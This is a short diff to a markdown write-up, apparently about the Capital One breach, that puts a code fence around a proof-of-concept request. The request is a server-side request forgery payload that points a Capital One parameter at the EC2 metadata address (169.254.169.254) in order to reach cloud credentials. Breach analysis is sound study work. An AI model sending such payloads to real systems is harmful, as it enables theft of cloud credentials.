@@ -79,8 +79,11 @@ It had been found out that the connection from erratic to the CapitalOne infstru
 ![evidence](/images/evidence.png)
 
 The PoC of reaching the EC2 credentials looked like:
+
+```javascript
 GET /?caponeurl=http://169.254.169.254/latest/meta-data/ HTTP/1.1
 Host: redacted.captialone.com
+```
 
 The premissions:
 ```javascript
